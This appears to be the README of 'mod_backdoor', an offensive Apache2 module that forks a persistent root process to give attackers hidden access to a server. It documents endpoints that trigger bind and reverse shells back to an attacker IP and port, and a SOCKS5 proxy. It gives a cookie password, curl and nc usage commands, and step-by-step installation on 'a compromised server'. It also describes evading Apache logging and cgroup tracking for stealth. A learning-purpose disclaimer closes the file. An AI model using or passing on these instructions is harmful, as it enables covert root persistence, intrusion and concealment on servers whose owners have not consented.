# Apache2 mod_backdoor

mod_backdoor is a stealth backdoor using an Apache2 module.  
The main idea is to fork() the primary Apache2 process just after it has loaded its config.
Since it's forked before the root user transfers the process to www-data, you can execute command as root.  
As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this 
forked root apache2 process, to let us interact as root with the compromised system.

# Features

* Bind TTY Shell
* Reverse Shell (TTY , Native, PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns 
a new forked independent root process **attached to PID 1** and **removed from apache2 cgroup**
* Socks5 proxy
* Password Protection through cookie headers
* Ping module to know if its still active
* Bypass logging mechanism. Each request to the backdoor module **are not logged** by Apache2.
* Works on systemd and non-systemd init (tested on debian and alpine)

# Demo
[![asciicast](https://asciinema.org/a/289452.svg)](https://asciinema.org/a/289452)
# Description

* The password is send through Cookie headers: `Cookie: password=backdoor`. It's defined with `#define` 
in the beginning of mod_backdoor.c, so you could easily edit it.  

* Each following requests must contain this password to interact with the module.  
* Each request containing this cookie **will not be logged by Apache** if the module is running.   

* Each shell spawns **attached to PID** 1 and **is removed from apache2 cgroup**.
 It means it's possible to **restart/stop apache2.service from a spawned shell** (not true for 
 TTY shells because an apache2 process is needed to do the bidirectional communication between socket
 and pty). It also improves stealth, shells are no longer related to apache2.service.   
 * IPC socket is stored in the private /tmp folder provided by systemd service (by default). 

On non-systemd systems, compile with `-DNO_SYSTEMD`. The main differences from the systemd build:
 * IPC socket is at `/var/run/mod_backdoor.sock` instead of the private `/tmp` namespace.
 * Daemon cleanup relies on three mechanisms:
   - `prctl(PR_SET_PDEATHSIG, SIGTERM)` — the daemon auto-terminates if the parent Apache process dies (crash, `SIGKILL`).
   - `atexit(backdoor_daemon_kill)` — the Apache parent sends `SIGTERM` to the daemon on normal exit.
   - PID file at `/var/run/mod_backdoor.pid` — init scripts can signal the daemon directly.

The apache2 server needs to be compiled with the mod_so to allow Dynamic Shared Object (DSO) support.
### Bind TTY Shell
The endpoint  `http[s]://<TARGET>/bind/<PORT>` binds a listening port on `<TARGET>:<PORT>`   
When a connection is initiated to the listening port, the port closes.   
`forkpty()` is used to obtain a native TTY shell, working with an IPC UNIX socket to communicate 
between forked TTY process and the new socket you just opened.  
Shells could be easily upgraded with the famous trick:  
 `CTRL-Z --> stty raw -echo --> fg --> reset`

### Reverse TTY Shell
It works like the bind shell, the endpoint `http[s]://<TARGET>/revtty/<IP>/<PORT>` returns a TTY
shell to `<IP>:<PORT>`   


### Reverse Shell (No TTY)
The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>`.   
`<PROG>` must be one of these:   
<p align="center">

| Native   | External  |    
| :------: | :--------:|
|   sh     |    php    |
|   bash   |    python |
|   dash   |    ruby   |
|   ash    |    perl   |
|   tcsh   |           |
|   ksh    |           |

</p>

`<PROG>` must be in lower-case.  
PHP uses the `exec` function.  
Ruby isn't using `/bin/sh`.

### Socks5 proxy
Source code comes from https://github.com/rofl0r/microsocks   
The endpoint `http[s]://<TARGET>/proxy/<PORT>/<USER>` opens a socks5 proxy on `<PORT>`. 
`<USER>` is optional. If you set it, it activates the auth mode. Password is the same as the mod_backdoor.  
Once a specific ip address authed successfully with `user:pass`, it is added to a whitelist and may use the proxy without auth. 
This is handy for programs like firefox that don't support `user:pass` auth.  
For it to work you'd basically make one connection with another program that supports it, and then you can use firefox too.  
Example:  
1. `curl -H 'Cookie: password=backdoor' http://<TARGET>/proxy/1337/vlad`   
--> Start socks proxy on port 1337 for `vlad` user 
2. `curl -x socks5://vlad:password=backdoor@<TARGET>:1337 https://www.google.com`   
--> Register your IP address
3. You could now use it without auth
4. When you're done, you can kill the socks proxy by sending `imdonewithyou` in a socket   
--> `echo "imdonewithyou" | nc <TARGET> 1337`

### Ping module
The endpoint `http[s]://<TARGET>/ping` tells you if the module is currently working.

# Known Issues

### SOCKS5 proxy on non-systemd builds — DNS resolution
On non-systemd builds (tested on Alpine), the SOCKS5 proxy fails to resolve hostnames when using `socks5h://` (remote DNS resolution). The proxy accepts the connection but closes it before completing the SOCKS handshake. Using `socks5://` (local DNS resolution via curl) keeps the proxy alive but may return `ENETUNREACH` depending on the network configuration.

The proxy **works correctly on non-systemd builds when targeting IP addresses directly** (no DNS resolution involved).

**Root cause:** `getaddrinfo()` behavior differs between glibc and musl when resolving hostnames for outbound connections. Further investigation is ongoing.

**Workaround:** Use `socks5://` instead of `socks5h://` and resolve hostnames on the client side. On systemd builds (tested on Debian) the proxy works without issues.

# Notes
Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))  
More info about Ringbuilder:  
https://github.com/TarlogicSecurity/mod_ringbuilder   
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/   

Socks5 code was adapted from https://github.com/rofl0r/microsocks   
  
Special thanks to [@Ug_0Security](https://twitter.com/Ug_0Security)

# Builds
For development :  
* `apxs -i -a -c mod_backdoor.c socks.c sblist.c sblist_delete.c server.c -Wl,-lutil`   
 `-Wl,-lutil` used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :  
* Compile it for the desired arch and retrieve the mod_backdoor.so or  
get it from the `build/` folder (compiled for: Apache/2.4.41 (Debian)).
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Copy backdoor.load to `/etc/apache2/mod-available/backdoor.load`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))

## Disclaimer
This project was created only for learning purpose.  
Usage of mod_backdoor for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws. 
Developers assume no liability and are not responsible for any misuse or damage caused by this program.
